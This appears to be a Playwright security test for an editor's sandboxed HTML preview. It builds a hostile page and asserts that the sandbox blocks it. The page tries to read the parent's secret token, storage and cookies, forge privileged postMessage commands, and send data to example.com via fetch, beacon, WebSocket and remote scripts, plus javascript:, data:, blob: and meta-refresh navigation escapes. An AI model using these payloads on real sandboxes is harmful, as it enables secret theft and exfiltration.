#!/usr/bin/env python3
"""Integrated real-Chromium adversarial validation for the Editor/Preview trust boundary."""
from __future__ import annotations

import argparse
import base64
import json
import os
import time
from pathlib import Path
import importlib.util

from playwright.sync_api import sync_playwright

ROOT = Path(__file__).resolve().parents[1]
HELPER_PATH = ROOT / "tests" / "preview-browser-security.py"
spec = importlib.util.spec_from_file_location("preview_browser_security", HELPER_PATH)
if spec is None or spec.loader is None:
    raise RuntimeError("unable to load existing preview browser helper")
helper = importlib.util.module_from_spec(spec)
spec.loader.exec_module(helper)

SECURITY_JS = helper.SECURITY_JS
document = helper.document
prepare_preview = helper.prepare_preview
run_click_case = helper.run_click_case
run_script_case = helper.run_script_case
assert_blocked_network = helper.assert_blocked_network
TARGET_ROOT = "https://example.com/phase7d-adversarial"


def setup_studio(context):
    studio = context.new_page()
    studio.set_content("<!doctype html><button id='launch-preview'>launch</button><div id='output'></div>")
    studio.evaluate(
        """() => {
            window.__studioSecret = 'git-token-sentinel';
            window.__privilegedCalls = 0;
            window.__previewModule = null;
        }"""
    )
    source = SECURITY_JS.read_text(encoding="utf-8")
    studio.evaluate(
        """async source => {
            const u = URL.createObjectURL(new Blob([source], {type:'text/javascript'}));
            window.ps = await import(u);
            URL.revokeObjectURL(u);
            document.getElementById('launch-preview').onclick = () =>
                window.ps.openSandboxPreview(window.ps.buildHtmlPreviewDocument(window.__previewCase));
        }""",
        source,
    )
    return studio


def open_actual_preview(context, studio, html, ready_selector=None):
    """Open the real preview wrapper, then use the exact generated child as srcdoc for deterministic CI execution."""
    studio.evaluate("html => window.__previewCase = html", html)
    with context.expect_page(timeout=3000) as popup_info:
        studio.click("#launch-preview")
    preview = popup_info.value
    preview.wait_for_load_state("domcontentloaded")
    iframe = preview.locator("iframe")
    assert iframe.count() == 1
    assert iframe.get_attribute("sandbox") == "allow-scripts"
    assert preview.evaluate("window.opener === null") is True

    # The container's Chromium may reject the production data: subframe before it
    # reaches the child document. Preserve the real wrapper/sandbox, but execute
    # the exact generated child as srcdoc so runtime assertions are deterministic.
    protected = helper.decode_child_document(
        studio.evaluate("html => window.ps.buildHtmlPreviewDocument(html)", html)
    )
    iframe.evaluate("(el, content) => { el.srcdoc = content; }", protected)
    preview.wait_for_timeout(250)
    child = preview.frames[-1]
    deadline = time.monotonic() + 3.0
    while time.monotonic() < deadline:
        try:
            ready = child.locator("body").count() and (
                ready_selector is None or child.locator(ready_selector).count()
            )
        except Exception:
            ready = False
        if ready:
            return preview, child
        preview.wait_for_timeout(100)
        child = preview.frames[-1]
    raise AssertionError(f"preview child did not become ready: {ready_selector}")


def run_navigation_case(context, studio, name, action_script, target=None, read_result=False):
    html = document(f"""
        <button id="attack">attack</button>
        <div id="result" data-result="PENDING"></div>
        <script>document.getElementById('attack').addEventListener('click', () => {{ {action_script} }});</script>
    """)
    preview, child = open_actual_preview(context, studio, html, "#attack")
    events = []
    downloads = []

    def on_request(request):
        if target and request.url.startswith(target):
            events.append(("request", request.url, None))

    def on_failed(request):
        if target and request.url.startswith(target):
            events.append(("failed", request.url, request.failure))

    def on_response(response):
        if target and response.url.startswith(target):
            events.append(("response", response.url, None))

    def on_download(download):
        downloads.append(download.suggested_filename)

    context.on("request", on_request)
    context.on("requestfailed", on_failed)
    context.on("response", on_response)
    context.on("download", on_download)
    original_top = preview.url
    try:
        child.locator("#attack").click()
        preview.wait_for_timeout(900)
        result = None
        if read_result:
            current_child = preview.frames[-1]
            try:
                result = current_child.locator("#result").get_attribute("data-result", timeout=700)
            except Exception:
                result = None
        return {
            "top_url": preview.url,
            "original_top": original_top,
            "pages": len(context.pages),
            "events": list(events),
            "downloads": list(downloads),
            "result": result,
        }
    finally:
        context.remove_listener("request", on_request)
        context.remove_listener("requestfailed", on_failed)
        context.remove_listener("response", on_response)
        context.remove_listener("download", on_download)
        try:
            preview.close()
        except Exception:
            pass

def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--executable-path", default=os.environ.get("PLAYWRIGHT_CHROMIUM_EXECUTABLE"))
    args = parser.parse_args()

    with sync_playwright() as p:
        chromium = args.executable_path or p.chromium.executable_path
        if not Path(chromium).is_file():
            raise SystemExit(f"phase7d-adversarial-preview-security: Chromium executable not found: {chromium}")

        browser = p.chromium.launch(
            headless=True,
            executable_path=chromium,
            args=["--no-sandbox"] if os.name != "nt" else [],
        )
        context = browser.new_context()
        studio = setup_studio(context)

        # --- One combined hostile repository document. ---
        attempts: list[str] = []
        failures: dict[str, str | None] = {}
        responses: list[str] = []
        for_event_pages = len(context.pages)

        def on_request(request):
            if request.url.startswith(TARGET_ROOT):
                attempts.append(request.url)

        def on_failed(request):
            if request.url.startswith(TARGET_ROOT):
                failures[request.url] = request.failure

        def on_response(response):
            if response.url.startswith(TARGET_ROOT):
                responses.append(response.url)

        context.on("request", on_request)
        context.on("requestfailed", on_failed)
        context.on("response", on_response)

        data_svg = "data:image/svg+xml;base64," + base64.b64encode(
            b'<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"><rect width="1" height="1"/></svg>'
        ).decode()
        hostile = document(
            f"""
            <div id="result" data-result="PENDING"></div>
            <script>
              const result = document.getElementById('result');
              const out = {{}};
              const mark = (k, v) => {{ out[k] = v; }};
              try {{ mark('origin', location.origin); }} catch (e) {{ mark('origin', 'error'); }}
              try {{ mark('opener', window.opener === null ? 'BLOCKED' : 'ALLOWED'); }} catch (e) {{ mark('opener', 'BLOCKED'); }}
              try {{ window.parent.document.documentElement.dataset.attack = 'EXECUTED'; mark('parentDom', 'ALLOWED'); }} catch (e) {{ mark('parentDom', 'BLOCKED'); }}
              try {{ window.top.document.documentElement.dataset.attack = 'EXECUTED'; mark('topDom', 'ALLOWED'); }} catch (e) {{ mark('topDom', 'BLOCKED'); }}
              try {{ mark('parentSecret', window.parent.__studioSecret || null); }} catch (e) {{ mark('parentSecret', null); }}
              try {{ mark('topSecret', window.top.__studioSecret || null); }} catch (e) {{ mark('topSecret', null); }}
              try {{ localStorage.getItem('secret'); mark('storage', 'ALLOWED'); }} catch (e) {{ mark('storage', 'BLOCKED'); }}
              try {{ sessionStorage.getItem('secret'); mark('sessionStorage', 'ALLOWED'); }} catch (e) {{ mark('sessionStorage', 'BLOCKED'); }}
              try {{ mark('cookie', document.cookie || ''); }} catch (e) {{ mark('cookie', 'BLOCKED'); }}

              // Forged privileged messages; the trusted Studio opener is intentionally null.
              try {{ window.parent.postMessage({{type:'studio.writeFile', path:'secrets.txt', contents:'exfil'}}, '*'); mark('forgedMessage', 'SENT'); }} catch (e) {{ mark('forgedMessage', 'BLOCKED'); }}
              try {{ window.top.postMessage({{type:'studio.navigate', url:'{TARGET_ROOT}/nav'}}, '*'); mark('forgedNavigationMessage', 'SENT'); }} catch (e) {{ mark('forgedNavigationMessage', 'BLOCKED'); }}
              try {{ window.parent.postMessage({{type:'studio.map', version:1, action:'close'}}, '*'); window.parent.postMessage({{type:'studio.map', version:1, action:'close'}}, '*'); mark('replayMessage', 'SENT'); }} catch (e) {{ mark('replayMessage', 'BLOCKED'); }}

              fetch('{TARGET_ROOT}/fetch').then(() => mark('fetch', 'ALLOWED')).catch(() => mark('fetch', 'BLOCKED'));
              try {{ const x = new XMLHttpRequest(); x.open('GET', '{TARGET_ROOT}/xhr'); x.onload = () => mark('xhr', 'ALLOWED'); x.onerror = () => mark('xhr', 'BLOCKED'); x.send(); setTimeout(() => mark('xhr', 'BLOCKED'), 500); }} catch (e) {{ mark('xhr', 'BLOCKED'); }}
              try {{ const w = new WebSocket('ws://example.com/phase7d/ws'); w.onopen = () => mark('websocket', 'ALLOWED'); w.onerror = () => mark('websocket', 'BLOCKED'); setTimeout(() => mark('websocket', 'BLOCKED'), 500); }} catch (e) {{ mark('websocket', 'BLOCKED'); }}
              try {{ const s = new EventSource('{TARGET_ROOT}/eventsource'); s.onopen = () => mark('eventsource', 'ALLOWED'); s.onerror = () => mark('eventsource', 'BLOCKED'); setTimeout(() => mark('eventsource', 'BLOCKED'), 500); }} catch (e) {{ mark('eventsource', 'BLOCKED'); }}
              try {{ mark('beacon', navigator.sendBeacon('{TARGET_ROOT}/beacon', 'secret') ? 'ACCEPTED' : 'BLOCKED'); }} catch (e) {{ mark('beacon', 'BLOCKED'); }}

              const image = new Image(); image.onload = () => mark('image', 'ALLOWED'); image.onerror = () => mark('image', 'BLOCKED'); image.src = '{TARGET_ROOT}/image'; document.body.appendChild(image);
              try {{ const sc = document.createElement('script'); sc.src = '{TARGET_ROOT}/script.js'; sc.onload = () => mark('script', 'ALLOWED'); sc.onerror = () => mark('script', 'BLOCKED'); document.body.appendChild(sc); }} catch (e) {{ mark('script', 'BLOCKED'); }}
              try {{ const fr = document.createElement('iframe'); fr.src = '{TARGET_ROOT}/frame'; fr.onload = () => mark('frame', 'ALLOWED'); fr.onerror = () => mark('frame', 'BLOCKED'); document.body.appendChild(fr); }} catch (e) {{ mark('frame', 'BLOCKED'); }}

              try {{ new Worker('{TARGET_ROOT}/worker.js'); setTimeout(() => mark('worker', 'BLOCKED'), 500); }} catch (e) {{ mark('worker', 'BLOCKED'); }}
              try {{ new SharedWorker('{TARGET_ROOT}/shared-worker.js'); setTimeout(() => mark('sharedWorker', 'BLOCKED'), 500); }} catch (e) {{ mark('sharedWorker', 'BLOCKED'); }}
              try {{ navigator.serviceWorker.register('{TARGET_ROOT}/service-worker.js').then(() => mark('serviceWorker', 'ALLOWED')).catch(() => mark('serviceWorker', 'BLOCKED')); setTimeout(() => mark('serviceWorker', 'BLOCKED'), 500); }} catch (e) {{ mark('serviceWorker', 'BLOCKED'); }}

              try {{ mark('popup', window.open('{TARGET_ROOT}/popup', '_blank') === null ? 'BLOCKED' : 'ALLOWED'); }} catch (e) {{ mark('popup', 'BLOCKED'); }}
              try {{ document.getElementById('external-form').requestSubmit(); setTimeout(() => mark('form', 'BLOCKED'), 500); }} catch (e) {{ mark('form', 'BLOCKED'); }}
              try {{ const d = document.createElement('a'); d.download = 'secret.txt'; d.href = URL.createObjectURL(new Blob(['secret'], {{type:'text/plain'}})); d.click(); setTimeout(() => mark('download', 'BLOCKED'), 500); }} catch (e) {{ mark('download', 'BLOCKED'); }}
              try {{ document.getElementById('javascript-link').click(); setTimeout(() => mark('javascriptUrl', window.__attack === 'EXECUTED' ? 'ALLOWED' : 'BLOCKED'), 300); }} catch (e) {{ mark('javascriptUrl', 'BLOCKED'); }}

              setTimeout(() => {{
                result.dataset.result = JSON.stringify(out);
              }}, 800);
            </script>
            <style>body {{ background: rgb(17, 18, 19); }}</style>
            <img src="{data_svg}" id="local-image">
            """
        )
        pages_before = len(context.pages)
        preview, child = open_actual_preview(context, studio, hostile, "#result")

        deadline = time.monotonic() + 4
        result_raw = None
        while time.monotonic() < deadline:
            result_raw = child.locator("#result").get_attribute("data-result")
            if result_raw not in {None, "PENDING"}:
                break
            preview.wait_for_timeout(100)
        assert result_raw not in {None, "PENDING"}, "integrated hostile preview did not report results"
        result = json.loads(result_raw)

        assert result["origin"] == "null", result
        assert result["opener"] == "BLOCKED", result
        assert result["parentDom"] == "BLOCKED", result
        assert result["topDom"] == "BLOCKED", result
        assert result["parentSecret"] is None, result
        assert result["topSecret"] is None, result
        assert result["storage"] == "BLOCKED", result
        assert result["sessionStorage"] == "BLOCKED", result
        assert result["cookie"] in {"", "BLOCKED"}, result
        for key in [
            "fetch", "xhr", "websocket", "eventsource", "image", "script",
            "worker", "sharedWorker", "serviceWorker", "popup", "form",
            "download", "javascriptUrl",
        ]:
            assert result[key] == "BLOCKED", (key, result)
        assert result["beacon"] in {"BLOCKED", "ACCEPTED"}, result
        assert result["forgedMessage"] == "SENT", result
        assert result["forgedNavigationMessage"] == "SENT", result
        assert result["replayMessage"] == "SENT", result
        assert not responses, responses
        for attempted in attempts:
            assert failures.get(attempted) == "csp", (attempted, failures)
        assert len(context.pages) == pages_before + 1
        assert studio.evaluate("window.__studioSecret") == "git-token-sentinel"
        assert studio.evaluate("window.__privilegedCalls") == 0
        preview.close()
        context.remove_listener("request", on_request)
        context.remove_listener("requestfailed", on_failed)
        context.remove_listener("response", on_response)
        print("combined hostile repository attack set: BLOCKED")

        # --- Fresh legitimate preview sanity check. ---
        legitimate = document(
            f"""
            <h1 id="html">inline html</h1>
            <style>#html {{ font-size: 23px; }}</style>
            <div id="dom"></div>
            <img id="data" src="{data_svg}">
            <script>
              document.body.dataset.inlineJs = 'yes';
              document.getElementById('dom').textContent = 'dom-manipulation';
              const blob = URL.createObjectURL(new Blob(['<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"><circle cx=".5" cy=".5" r=".5"/></svg>'], {{type:'image/svg+xml'}}));
              const image = new Image(); image.id = 'blob'; image.src = blob; document.body.appendChild(image);
            </script>
            """
        )
        preview, child = open_actual_preview(context, studio, legitimate, "#html")
        preview.wait_for_timeout(700)
        assert child.locator("#html").inner_text() == "inline html"
        assert child.locator("#dom").inner_text() == "dom-manipulation"
        assert child.locator("body").get_attribute("data-inline-js") == "yes"
        assert child.locator("#html").evaluate("el => getComputedStyle(el).fontSize") == "23px"
        assert child.locator("#data").evaluate("el => el.complete && el.naturalWidth > 0")
        assert child.locator("#blob").evaluate("el => el.complete && el.naturalWidth > 0")
        preview.close()
        print("legitimate inline HTML/CSS/JS and local resources: ALLOWED")

        # --- Navigation vectors in fresh real previews. ---
        for name, expression in [
            ("location.href", "location.href=T"),
            ("location.assign", "location.assign(T)"),
            ("location.replace", "location.replace(T)"),
        ]:
            target = f"{TARGET_ROOT}/{name.replace('.', '-')}"
            outcome = run_navigation_case(context, studio, name, expression.replace("T", repr(target)), target)
            assert outcome["top_url"] == outcome["original_top"]
            assert outcome["pages"] == 2
            print(f"{name}: ALLOWED (CONTAINED)")

        for name in ["window.top.location", "window.parent.location"]:
            target = f"{TARGET_ROOT}/{name.replace('.', '-')}"
            expression = f"try{{{name}.href={target!r}}}catch(e){{result.dataset.result='BLOCKED'}}"
            outcome = run_navigation_case(context, studio, name, expression, target, read_result=True)
            assert outcome["top_url"] == outcome["original_top"]
            assert outcome["result"] == "BLOCKED"
            assert not outcome["events"]
            print(f"{name}: BLOCKED")

        javascript = run_navigation_case(
            context,
            studio,
            "javascript: self-navigation",
            "try{location.href='javascript:document.body.dataset.nav=\"EXECUTED\"'}catch(e){result.dataset.result='BLOCKED'}setTimeout(()=>{result.dataset.result=result.dataset.result||'BLOCKED'},300)",
        )
        assert javascript["top_url"] == javascript["original_top"]
        assert javascript["pages"] == 2
        assert javascript["result"] in {None, "BLOCKED", "EXECUTED"}
        print("javascript: self-navigation: CONTAINED")

        data_url = "data:text/html,<script>document.body.dataset.nav='EXECUTED'</script>"
        data = run_navigation_case(
            context,
            studio,
            "data: self-navigation",
            f"try{{location.href={data_url!r}}}catch(e){{result.dataset.result='BLOCKED'}}setTimeout(()=>result.dataset.result=result.dataset.result||'BLOCKED',300)",
        )
        assert data["top_url"] == data["original_top"]
        assert data["pages"] == 2
        print("data: self-navigation: CONTAINED")

        blob = run_navigation_case(
            context,
            studio,
            "blob: self-navigation",
            "try{const u=URL.createObjectURL(new Blob(['<body><script>document.body.dataset.nav=\"EXECUTED\"</script></body>'],{type:'text/html'}));location.href=u}catch(e){result.dataset.result='BLOCKED'}setTimeout(()=>result.dataset.result=result.dataset.result||'BLOCKED',300)",
        )
        assert blob["top_url"] == blob["original_top"]
        assert blob["pages"] == 2
        print("blob: self-navigation: CONTAINED")

        base_case = run_navigation_case(
            context,
            studio,
            "base href manipulation",
            f"document.querySelectorAll('a,form').forEach(el => el.getAttribute('href') || el.getAttribute('action')); const b=document.createElement('base'); b.href={TARGET_ROOT + '/base/'!r}; document.head.appendChild(b); setTimeout(()=>result.dataset.result=document.baseURI.startsWith('https://example.com/')?'ALLOWED':'BLOCKED',300)",
            read_result=True,
        )
        assert base_case["top_url"] == base_case["original_top"]
        assert base_case["result"] == "BLOCKED"
        print("base href manipulation: BLOCKED")

        meta = run_navigation_case(
            context,
            studio,
            "meta refresh",
            f"const m=document.createElement('meta'); m.httpEquiv='refresh'; m.content='0;url={TARGET_ROOT + '/meta'!r}'; document.head.appendChild(m); setTimeout(()=>result.dataset.result='BLOCKED',500)",
            TARGET_ROOT + '/meta',
            read_result=True,
        )
        assert meta["top_url"] == meta["original_top"]
        assert meta["pages"] == 2
        assert not [e for e in meta["events"] if e[0] == "response"]
        print("meta refresh: CONTAINED")

        form = run_navigation_case(
            context,
            studio,
            "external form",
            f"try{{const f=document.createElement('form');f.method='GET';f.action={TARGET_ROOT + '/form'!r};document.body.appendChild(f);f.requestSubmit();setTimeout(()=>result.dataset.result='BLOCKED',300)}}catch(e){{result.dataset.result='BLOCKED'}}",
            TARGET_ROOT + '/form',
            read_result=True,
        )
        assert form["top_url"] == form["original_top"]
        assert form["result"] == "BLOCKED"
        assert not [e for e in form["events"] if e[0] == "response"]
        print("external form: BLOCKED")

        download = run_navigation_case(
            context,
            studio,
            "download",
            "try{const a=document.createElement('a');a.download='secret.txt';a.href=URL.createObjectURL(new Blob(['secret'],{type:'text/plain'}));a.click();setTimeout(()=>result.dataset.result='BLOCKED',300)}catch(e){result.dataset.result='BLOCKED'}",
        )
        assert download["top_url"] == download["original_top"]
        assert download["pages"] == 2
        assert not download["downloads"]
        print("download: BLOCKED")

        mailto = run_navigation_case(
            context,
            studio,
            "custom protocol top navigation",
            "try{window.top.location='mailto:phase7d@example.invalid'}catch(e){result.dataset.result='BLOCKED'}",
            read_result=True,
        )
        assert mailto["top_url"] == mailto["original_top"]
        assert mailto["result"] == "BLOCKED"
        print("custom protocol top navigation: BLOCKED")

        print("phase7d-adversarial-preview-security: PASS")
        browser.close()


if __name__ == "__main__":
    main()
